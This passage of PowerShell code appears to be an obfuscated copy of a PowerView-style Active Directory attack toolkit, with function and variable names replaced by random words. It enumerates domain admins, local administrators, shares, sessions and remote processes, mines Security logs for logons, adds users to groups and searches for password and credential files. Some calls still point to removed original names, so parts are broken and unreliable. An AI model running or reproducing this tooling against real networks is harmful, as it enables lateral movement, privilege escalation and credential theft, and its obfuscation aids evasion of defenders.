                $LzgrLlFw99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $LzgrLlFw99.filter = "(&(objectClass=group)(name=$YrweeofD99))"
            $LzgrLlFw99.PageSize = 200
        
            $LzgrLlFw99.FindAll() | ForEach-Object {
                if ($KACNAvrx99){
                    $_.properties
                }
                else{
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning "[!] The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $LzgrLlFw99 = [adsisearcher]"(&(objectClass=group)(name=$YrweeofD99))"
        $LzgrLlFw99.PageSize = 200
        
        try {
            $LzgrLlFw99.FindAll() | ForEach-Object {
                if ($KACNAvrx99){
                    $_.properties
                }
                else{
                    $_.properties.samaccountname
                }
            }
        }
        catch{
            Write-Warning '[!] Can not contact domain.'
        }
    }
}
function compelling {
    
    [CmdletBinding()]
    param(
        [string]
        $YrweeofD99 = 'Domain Admins',
        [Switch]
        $KACNAvrx99,
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $LzgrLlFw99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $LzgrLlFw99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            $LzgrLlFw99.filter = "(&(objectClass=group)(name=$YrweeofD99))"
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $LzgrLlFw99 = [adsisearcher]"(&(objectClass=group)(name=$YrweeofD99))"
    }
    
    if ($LzgrLlFw99){
        if ($KACNAvrx99) {
            if($zrCEhkbw99){
                $LzgrLlFw99.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$zrCEhkbw99/$_").Properties
                }
            }
            else{
                $LzgrLlFw99.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$_").Properties
                }
            }
        }
        else{
            if($zrCEhkbw99){
                $LzgrLlFw99.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$zrCEhkbw99/$_").SamAccountName
                }
            }
            else{
                $LzgrLlFw99.FindOne().properties['member'] | ForEach-Object {
                    ([adsi]"LDAP://$_").SamAccountName
                }
            }
        }
    }
}
function formulate {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $nMIWdEkf99
    )
    
    $VjBSuPpJ99 = @()
    
    if($nMIWdEkf99){
        if (Test-Path -Path $nMIWdEkf99){
            $VjBSuPpJ99 = Get-Content -Path $nMIWdEkf99
        }
        else{
            Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
            $null
        }
    }
    else{
        $VjBSuPpJ99 = $($uVOoDBse99)
    }
    
    foreach($LxIyYIwe99 in $VjBSuPpJ99)
    {
        try{
            $SEzLwJsD99 = [ADSI]"WinNT://$LxIyYIwe99,computer"
            
            $SEzLwJsD99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Server' $LxIyYIwe99
                $out | Add-Member Noteproperty 'Group' (($_.name)[0])
                $out | Add-Member Noteproperty 'SID' ((new-object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                $out
            }
        }
        catch{
            Write-Warning "[!] Error: $_"
        }
    }
}
function douches {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $nMIWdEkf99,
        
        [string]
        $YrweeofD99
    )
    function clarinetist
    {
        param($HEX)
        ForEach ($value in $HEX)
        {
            [string][Convert]::ToInt32($value,16)
        }
    }
    function poignantly
    {
        param($WDAmrzvr99)
        
        $a = $WDAmrzvr99.substring(0,2)
        $b = $WDAmrzvr99.substring(2,2)
        $c = $WDAmrzvr99.substring(4,2)
        $d = $WDAmrzvr99.substring(6,2)
        $d+$c+$b+$a
    }
    function Ellison
    {
        param($bytes)
        
        try{
            $lXljZVSq99 = -join ([byte[]]($bytes) | ForEach-Object {$_.ToString('X2')})
            foreach($WDAmrzvr99 in $lXljZVSq99) {
                [INT]$ynYhwqZO99 = $WDAmrzvr99.substring(0,2)
                [INT]$SEIyQUbB99 = $WDAmrzvr99.substring(2,2)
                [INT]$HKFpWNgk99 = clarinetist(poignantly($WDAmrzvr99.substring(16,8)))
                $oAeQRvRW99 = $WDAmrzvr99.substring(24,8)
                $ZIobaBFs99 = $WDAmrzvr99.substring(32,8)
                $tdLrVZrw99 = $WDAmrzvr99.substring(40,8)
                $EdZQzrCN99 = $WDAmrzvr99.substring(48,8)
                [string]$ZrabJwCI99=Convert-HextoDEC(poignantly($oAeQRvRW99))
                [string]$QHoCZrXo99=Convert-HextoDEC(poignantly($ZIobaBFs99))
                [string]$pyHXOZjj99=Convert-HextoDEC(poignantly($tdLrVZrw99))
                [string]$UID=Convert-HextoDEC(poignantly($EdZQzrCN99))
                "S-$ynYhwqZO99-$SEIyQUbB99-$HKFpWNgk99-$ZrabJwCI99-$QHoCZrXo99-$pyHXOZjj99-$UID"
            }
        }
        catch {
            'ERROR'
        }
    }
    $VjBSuPpJ99 = @()
    
    if($nMIWdEkf99){
        if (Test-Path -Path $nMIWdEkf99){
            $VjBSuPpJ99 = Get-Content -Path $nMIWdEkf99
        }
        else{
            Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
            $null
        }
    }
    else{
        $VjBSuPpJ99 = $($uVOoDBse99)
    }
    
    if (-not $YrweeofD99){
        $cvZQCVGl99 = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
        $ZPDdxoMA99 = $cvZQCVGl99.Translate( [System.Security.Principal.NTAccount])
        $YrweeofD99 = ($ZPDdxoMA99.Value).Split('\')[1]
    }
    
    foreach($LxIyYIwe99 in $VjBSuPpJ99)
    {
        try{
            $CvmvvbHo99 = @($([ADSI]"WinNT://$LxIyYIwe99/$YrweeofD99").psbase.Invoke('Members'))
            $CvmvvbHo99 | ForEach-Object {
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Server' $LxIyYIwe99
                $out | Add-Member Noteproperty 'AccountName' ( $_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')
                $out | Add-Member Noteproperty 'SID' (Ellison ($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $null, $_, $null)))
                $out | Add-Member Noteproperty 'Disabled' $(if((($_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')-like "*/$LxIyYIwe99/*")) {try{$_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $null, $_, $null)} catch {'ERROR'} } else {$False} ) 
                $out | Add-Member Noteproperty 'IsGroup' ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                $out
            }
        }
        catch {
            Write-Warning "[!] Error: $_"
        }
    }
}
function emulate {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $nMIWdEkf99
    )
    
    $VjBSuPpJ99 = @()
    
    if($nMIWdEkf99){
        if (Test-Path -Path $nMIWdEkf99){
            $VjBSuPpJ99 = Get-Content -Path $nMIWdEkf99
        }
        else{
            Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
            return
        }
    }
    else{
        $VjBSuPpJ99 = $($uVOoDBse99)
    }
    
    foreach($LxIyYIwe99 in $VjBSuPpJ99)
    {
        $SEzLwJsD99 = [ADSI]"WinNT://$LxIyYIwe99,computer"
        
        $SEzLwJsD99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'service' } | ForEach-Object {
            $out = New-Object psobject
            $out | Add-Member Noteproperty 'Server' $LxIyYIwe99
            $out | Add-Member Noteproperty 'ServiceName' $_.name[0]
            $out | Add-Member Noteproperty 'ServicePath' $_.Path[0]
            $out | Add-Member Noteproperty 'ServiceAccountName' $_.ServiceAccountName[0]
            $out
        }
    }
}
function monuments {
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [string]
        $EOQyLHjF99,
        [Parameter(Mandatory = $True)] 
        [string]
        $YrweeofD99,
        
        [string]
        $dOCGgZVW99,
        
        [string]
        $uVOoDBse99 = 'localhost'
    )
    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    
    if($uVOoDBse99 -ne 'localhost'){
        try{
            ([ADSI]"WinNT://$uVOoDBse99/$YrweeofD99,group").add("WinNT://$uVOoDBse99/$EOQyLHjF99,user")
            "[*] User $EOQyLHjF99 successfully added to group $YrweeofD99 on $uVOoDBse99"
        }
        catch{
            Write-Warning "[!] Error adding user $EOQyLHjF99 to group $YrweeofD99 on $uVOoDBse99"
            return
        }
    }
    
    else{
        if ($dOCGgZVW99){
            try{
                $fQhHoBDz99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dOCGgZVW99)
                $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($fQhHoBDz99)
                
                $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            }
            catch{
                Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
                return $null
            }
        }
        else{
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }
        
        $ODBisMJv99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
        
        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ODBisMJv99,$YrweeofD99)
        
        $group.Members.add($ODBisMJv99, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $EOQyLHjF99)
        
        $group.Save()
    }
}
function Teller {
    
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99
    )
    
    $jQtYlnNa99 = @()
    
    if ($dOCGgZVW99){
        $users = bounciest -dOCGgZVW99 $dOCGgZVW99
    }
    else{
        $users = bounciest
    }
    
    foreach ($user in $users){
        
        $d = $user.homedirectory
        if ($d){
            $d = $user.homedirectory[0]
        }
        if (($d -ne $null) -and ($d.trim() -ne '')){
            $parts = $d.split('\')
            if ($parts.count -gt 2){
                if($parts[2] -ne ''){
                    $jQtYlnNa99 += $parts[2].toLower()
                }
            }
        }
    }
    
    $($jQtYlnNa99 | Sort-Object | Get-Unique)
}
function Carly {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $XbWLYhOU99 = 1
    $bIeqyYgG99 = [IntPtr]::Zero
    $HZzSskLa99 = 0
    $tREEvvpT99 = 0
    $ECMLBSMS99 = 0
    $dUvHVjaA99 = $ckJEUlpR99::NetShareEnum($uVOoDBse99, $XbWLYhOU99,[ref]$bIeqyYgG99,-1,[ref]$HZzSskLa99,[ref]$tREEvvpT99,[ref]$ECMLBSMS99)
    $wjIivkrY99 = $bIeqyYgG99.ToInt64()
    
    Write-Debug "Carly result: $dUvHVjaA99"
    
    if (($dUvHVjaA99 -eq 0) -and ($wjIivkrY99 -gt 0)) {
        
        $VTyUrRle99 = $ZBIJeAFb99::GetSize()
        
        for ($i = 0; ($i -lt $HZzSskLa99); $i++){
            $dZkhLeFW99 = New-Object system.Intptr -ArgumentList $wjIivkrY99
            $Info = $dZkhLeFW99 -as $ZBIJeAFb99
            $Info | Select-Object *
            $wjIivkrY99 = $dZkhLeFW99.ToInt64()
            $wjIivkrY99 += $VTyUrRle99
        }
        $ckJEUlpR99::NetApiBufferFree($bIeqyYgG99) | Out-Null
    }
    else 
    {
        switch ($dUvHVjaA99) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}
function Pentecost {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $XbWLYhOU99 = 1
    $bIeqyYgG99 = [IntPtr]::Zero
    $HZzSskLa99 = 0
    $tREEvvpT99 = 0
    $ECMLBSMS99 = 0
    $dUvHVjaA99 = $ckJEUlpR99::NetWkstaUserEnum($uVOoDBse99, $XbWLYhOU99,[ref]$bIeqyYgG99,-1,[ref]$HZzSskLa99,[ref]$tREEvvpT99,[ref]$ECMLBSMS99)
    
    $wjIivkrY99 = $bIeqyYgG99.ToInt64()
    
    Write-Debug "Pentecost result: $dUvHVjaA99"
    
    if (($dUvHVjaA99 -eq 0) -and ($wjIivkrY99 -gt 0)) {
        
        $VTyUrRle99 = $pcedBMWd99::GetSize()
        for ($i = 0; ($i -lt $HZzSskLa99); $i++){
            $dZkhLeFW99 = New-Object system.Intptr -ArgumentList $wjIivkrY99
            $Info = $dZkhLeFW99 -as $pcedBMWd99
            $Info | Select-Object *
            $wjIivkrY99 = $dZkhLeFW99.ToInt64()
            $wjIivkrY99 += $VTyUrRle99
        }
        $ckJEUlpR99::NetApiBufferFree($bIeqyYgG99) | Out-Null
    }
    else 
    {
        switch ($dUvHVjaA99) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}
function Triton {
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $Share = "C$"
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $XbWLYhOU99 = 1
    $bIeqyYgG99 = [IntPtr]::Zero
    $HZzSskLa99 = 0
    $tREEvvpT99 = 0
    $ECMLBSMS99 = 0
    $dUvHVjaA99 = $ckJEUlpR99::NetConnectionEnum($uVOoDBse99, $Share, $XbWLYhOU99,[ref]$bIeqyYgG99,-1,[ref]$HZzSskLa99,[ref]$tREEvvpT99,[ref]$ECMLBSMS99)   
    
    $wjIivkrY99 = $bIeqyYgG99.ToInt64()
    
    Write-Debug "Get-NetConnection result: $dUvHVjaA99"
    
    if (($dUvHVjaA99 -eq 0) -and ($wjIivkrY99 -gt 0)) {
        
        $VTyUrRle99 = $XNrtCFwg99::GetSize()
        
        for ($i = 0; ($i -lt $HZzSskLa99); $i++){
            $dZkhLeFW99 = New-Object system.Intptr -ArgumentList $wjIivkrY99
            $Info = $dZkhLeFW99 -as $XNrtCFwg99
            $Info | Select-Object *
            $wjIivkrY99 = $dZkhLeFW99.ToInt64()
            $wjIivkrY99 += $VTyUrRle99
        }
        $ckJEUlpR99::NetApiBufferFree($bIeqyYgG99) | Out-Null
    }
    else 
    {
        switch ($dUvHVjaA99) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}
function swagged {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $EOQyLHjF99 = ''
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    $XbWLYhOU99 = 10
    $bIeqyYgG99 = [IntPtr]::Zero
    $HZzSskLa99 = 0
    $tREEvvpT99 = 0
    $ECMLBSMS99 = 0
    $dUvHVjaA99 = $ckJEUlpR99::NetSessionEnum($uVOoDBse99, '', $EOQyLHjF99, $XbWLYhOU99,[ref]$bIeqyYgG99,-1,[ref]$HZzSskLa99,[ref]$tREEvvpT99,[ref]$ECMLBSMS99)    
    $wjIivkrY99 = $bIeqyYgG99.ToInt64()
    
    Write-Debug "swagged result: $dUvHVjaA99"
    
    if (($dUvHVjaA99 -eq 0) -and ($wjIivkrY99 -gt 0)) {
        
        $VTyUrRle99 = $JHzrCmEf99::GetSize()
        
        for ($i = 0; ($i -lt $HZzSskLa99); $i++){
            $dZkhLeFW99 = New-Object system.Intptr -ArgumentList $wjIivkrY99
            $Info = $dZkhLeFW99 -as $JHzrCmEf99
            $Info | Select-Object *
            $wjIivkrY99 = $dZkhLeFW99.ToInt64()
            $wjIivkrY99 += $VTyUrRle99
        }
        $ckJEUlpR99::NetApiBufferFree($bIeqyYgG99) | Out-Null
    }
    else 
    {
        switch ($dUvHVjaA99) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}
function supplicate {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $bmytjPQh99 = '',
        [string]
        $STLPXssk99
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    if ($STLPXssk99){
        $bmytjPQh99 = "\\$STLPXssk99"
    }
    
    $XbWLYhOU99 = 3
    $bIeqyYgG99 = [IntPtr]::Zero
    $HZzSskLa99 = 0
    $tREEvvpT99 = 0
    $ECMLBSMS99 = 0
    $dUvHVjaA99 = $ckJEUlpR99::NetFileEnum($uVOoDBse99, '', $bmytjPQh99, $XbWLYhOU99,[ref]$bIeqyYgG99,-1,[ref]$HZzSskLa99,[ref]$tREEvvpT99,[ref]$ECMLBSMS99)   
    $wjIivkrY99 = $bIeqyYgG99.ToInt64()
    
    Write-Debug "supplicate result: $dUvHVjaA99"
    
    if (($dUvHVjaA99 -eq 0) -and ($wjIivkrY99 -gt 0)) {
        
        $VTyUrRle99 = $pIYVwDZb99::GetSize()
        for ($i = 0; ($i -lt $HZzSskLa99); $i++){
            $dZkhLeFW99 = New-Object system.Intptr -ArgumentList $wjIivkrY99
            $Info = $dZkhLeFW99 -as $pIYVwDZb99
            $Info | Select-Object *
            $wjIivkrY99 = $dZkhLeFW99.ToInt64()
            $wjIivkrY99 += $VTyUrRle99
        }
        $ckJEUlpR99::NetApiBufferFree($bIeqyYgG99) | Out-Null
    }
    else 
    {
        switch ($dUvHVjaA99) {
            (5)           {Write-Debug  'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}
function critic {
    
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99 = 'localhost',
        [string]
        $JeGOQmAv99
    )
    
    $GvlpoKNj99=@{};
    
    Get-Netsessions -uVOoDBse99 $uVOoDBse99 | ForEach-Object { $GvlpoKNj99[$_.sesi10_username] = $_.sesi10_cname };
    
    $data = supplicate | Select-Object @{Name='Username';Expression={$_.fi3_username}},@{Name='Filepath';Expression={$_.fi3_pathname}},@{Name='Computer';Expression={$sess[$_.fi3_username]}}
    
    if ($JeGOQmAv99) {
        $data | export-csv -notypeinformation -path $JeGOQmAv99
    }
    else{
        $data
    }   
}
function willingly {
    
    [CmdletBinding()]
    param(
        $uVOoDBse99 = "."
    )
    
    try{
        $reg = [WMIClass]"\\$uVOoDBse99\root\default:stdRegProv"
        $hklm = 2147483650
        $key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
        $value = "LastLoggedOnUser"
        $reg.GetStringValue($hklm, $key, $value).sValue
    }
    catch{
        Write-Warning "[!] Error opening remote registry on $uVOoDBse99. Remote registry likely not enabled."
        $null
    }
}
function hosteling {
    
    [CmdletBinding()]
    param(
        [string]
        $uVOoDBse99,
        [string]
        $OsBLAPVE99,
        [string]
        $yHhugoYv99
    )
    
    if (-not $uVOoDBse99){
        $uVOoDBse99 = [System.Net.Dns]::GetHostName()
    }
    $IHZtxRsN99 = $Null
    if($OsBLAPVE99){
        if($yHhugoYv99){
            $HMcPgFiS99 = $yHhugoYv99 | ConvertTo-SecureString -asPlainText -Force
            $IHZtxRsN99 = New-Object System.Management.Automation.PSCredential($OsBLAPVE99,$HMcPgFiS99)
            try{
                Get-WMIobject -Class Win32_process -ComputerName $uVOoDBse99 -Credential $IHZtxRsN99 | % {
                    $owner=$_.getowner();
                    $out = new-object psobject 
                    $out | add-member Noteproperty 'Host' $uVOoDBse99
                    $out | add-member Noteproperty 'Process' $_.ProcessName
                    $out | add-member Noteproperty 'PID' $_.ProcessID
                    $out | add-member Noteproperty 'Domain' $owner.Domain
                    $out | add-member Noteproperty 'User' $owner.User
                    $out
                }
            }
            catch{
                Write-Verbose "[!] Error enumerating remote processes, access likely denied"
            }
        }
        else{
            Write-Warning "[!] RemotePassword must also be supplied!"
        }
    }
    else{
        try{
            Get-WMIobject -Class Win32_process -ComputerName $uVOoDBse99 | % {
                $owner=$_.getowner();
                $out = new-object psobject 
                $out | add-member Noteproperty 'Host' $uVOoDBse99
                $out | add-member Noteproperty 'Process' $_.ProcessName
                $out | add-member Noteproperty 'PID' $_.ProcessID
                $out | add-member Noteproperty 'Domain' $owner.Domain
                $out | add-member Noteproperty 'User' $owner.User
                $out
            }
        }
        catch{
            Write-Verbose "[!] Error enumerating remote processes, access likely denied"
        }
    }
}
function Pickett {
    Param(
        [string]
        $uVOoDBse99=$env:computername,
        [DateTime]
        $OkONtoJO99=[DateTime]::Today.AddDays(-5)
    )
    
    Get-WinEvent -ComputerName $uVOoDBse99 -FilterHashTable @{ LogName = "Security"; ID=4624; StartTime=$OkONtoJO99} | % {
  
        if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))'){
            if($matches){
                $logontype=$matches[0].trim()
                $matches = $Null
            }
        }
        if (($logontype -eq 2) -or ($logontype -eq 3)){
            try{
                if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)'){
                    if($matches){
                        $ENNziUOi99 = $matches[0].split("`n")[2].split(":")[1].trim()
                        $dOCGgZVW99 = $matches[0].split("`n")[3].split(":")[1].trim()
                        $matches = $Null
                    }
                }
                if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)'){
                    if($matches){
                        $addr=$matches[0].split("`n")[2].split(":")[1].trim()
                        $matches = $Null
                    }
                }
                
                if ($ENNziUOi99 -and (-not $ENNziUOi99.endsWith("$")) -and ($ENNziUOi99 -ne "ANONYMOUS LOGON"))
                {
                    $out = New-Object psobject
                    $out | Add-Member NoteProperty 'Domain' $dOCGgZVW99
                    $out | Add-Member NoteProperty 'Username' $ENNziUOi99
                    $out | Add-Member NoteProperty 'Address' $addr
                    $out | Add-Member NoteProperty 'Time' $_.TimeCreated
                    $out 
                }
            }
            catch{}
        }
    }
}
function paradox {
    Param(
        [string]
        $uVOoDBse99=$env:computername,
        [DateTime]
        $OkONtoJO99=[DateTime]::Today.AddDays(-5)
    )
    
    Get-WinEvent -ComputerName $uVOoDBse99 -FilterHashTable @{ LogName = "Security"; ID=4768; StartTime=$OkONtoJO99} | % {
        try{
            if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)'){
                if($matches){
                    $ENNziUOi99 = $matches[0].split("`n")[1].split(":")[1].trim()
                    $dOCGgZVW99 = $matches[0].split("`n")[2].split(":")[1].trim()
                    $matches = $Null
                }
            }
            if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)'){
                if($matches){
                    $addr = $matches[0].split("`n")[1].split(":")[-1].trim()
                    $matches = $Null
                }
            }
            
            $out = New-Object psobject
            $out | Add-Member NoteProperty 'Domain' $dOCGgZVW99
            $out | Add-Member NoteProperty 'Username' $ENNziUOi99
            $out | Add-Member NoteProperty 'Address' $addr
            $out | Add-Member NoteProperty 'Time' $_.TimeCreated
            $out 
        }
        catch{}
    }
}
function murmuring {
    
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99,
        [string[]]
        $FrdSCUXu99
    )
    
    if ($FrdSCUXu99){
        if ($dOCGgZVW99){
            $users = bounciest -dOCGgZVW99 $dOCGgZVW99
        }
        else{
            $users = bounciest
        }
        $users | ForEach-Object {
            
            $props = @{}
            $s = $_.Item('SamAccountName')
            $props.Add('SamAccountName', "$s")
            
            if($FrdSCUXu99 -isnot [system.array]){
                $FrdSCUXu99 = @($FrdSCUXu99)
            }
            foreach($wAvkAxeB99 in $FrdSCUXu99){
                $p = $_.Item($wAvkAxeB99)
                $props.Add($wAvkAxeB99, "$p")
            }
            [pscustomobject] $props
        }
        
    }
    else{
        if ($dOCGgZVW99){
            try{
                $zrCEhkbw99 = ([Array](popularly))[0].Name
            }
            catch{
                $zrCEhkbw99 = $Null
            }
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $blDLinPB99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            $blDLinPB99.filter = '(&(samAccountType=805306368))'
            (($blDLinPB99.FindAll())[0].properties).PropertyNames
        }
        else{
            ((([adsisearcher]'objectCategory=User').Findall())[0].properties).PropertyNames
        }
    }
}
function adhered {
    
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99,
        [string[]]
        $FrdSCUXu99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn") 
            }
            else{
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $QBVQanaY99.filter='(&(objectClass=Computer))'
            
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $QBVQanaY99 = [adsisearcher]'(&(objectClass=Computer))'
    }
    
    
    if ($QBVQanaY99){
        if ($FrdSCUXu99){
            $QBVQanaY99.FindAll() | ForEach-Object {
                $props = @{}
                $s = $_.Properties.name
                $props.Add('Name', "$s")
                
                if($FrdSCUXu99 -isnot [system.array]){
                    $FrdSCUXu99 = @($FrdSCUXu99)
                }
                foreach($wAvkAxeB99 in $FrdSCUXu99){
                    $p = $_.Properties.$wAvkAxeB99
                    $props.Add($wAvkAxeB99, "$p")
                }
                [pscustomobject] $props
            }
        }
        else{
            (($QBVQanaY99.FindAll())[0].properties).PropertyNames
        }
    }
}
function locket {
    
    [CmdletBinding()]
    param(
        [string]
        $Path = '.\',
        [string[]]
        $Terms,
        [Switch]
        $UcUfahUc99,
        
        [Switch]
        $YrBDvecf99,
        [string]
        $rlhLsJBJ99 = '1/1/1970',
        [string]
        $beHpfBFb99 = '1/1/1970',
        [string]
        $TnvLvEKe99 = '1/1/1970',
        [Switch]
        $qWuauHEy99,
        [Switch]
        $oyatszxc99,
        [Switch]
        $qlDFbOCS99,
        [string]
        $JeGOQmAv99
    )
    
    $DXPOWHXa99 = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')
    
    if ($Terms){
        if($Terms -isnot [system.array]){
            $Terms = @($Terms)
        }
        $DXPOWHXa99 = $Terms
    }
    
    for ($i = 0; $i -lt $DXPOWHXa99.Count; $i++) {
        $DXPOWHXa99[$i] = "*$($DXPOWHXa99[$i])*"
    }
    
    if ($UcUfahUc99){
        $DXPOWHXa99 = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
    }
    
    if($YrBDvecf99){
        $rlhLsJBJ99 = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
        $DXPOWHXa99 = '*.exe'
    }
    
    Write-Verbose "[*] Search path $Path"
